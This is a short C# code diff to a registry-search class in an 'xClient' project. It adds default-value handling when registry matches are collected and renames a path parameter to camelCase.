@@ -5,6 +5,7 @@ using System.Security;
 using Microsoft.Win32;
 using System.Threading;
 using xClient.Core.Extensions;
+using xClient.Core.Helper;
 
 namespace xClient.Core.Registry
 {
@@ -123,11 +124,11 @@ namespace xClient.Core.Registry
                     values.Add(new RegValueData(valueName, valueType, valueData));
                 }
 
-                AddMatch(keyName, values.ToArray(), key.SubKeyCount);
+                AddMatch(keyName, RegistryKeyHelper.AddDefaultValue(values), key.SubKeyCount);
             }
             else
             {
-                AddMatch(keyName, null, 0);
+                AddMatch(keyName, RegistryKeyHelper.GetDefaultValues(), 0);
             }
 
         }
@@ -139,9 +140,9 @@ namespace xClient.Core.Registry
             matches.Add(match);
         }
 
-        public static RegistryKey GetRootKey(string subkey_fullpath)
+        public static RegistryKey GetRootKey(string subkeyFullPath)
         {
-            string[] path = subkey_fullpath.Split('\\');
+            string[] path = subkeyFullPath.Split('\\');
             try
             {
                 switch (path[0]) // <== root;
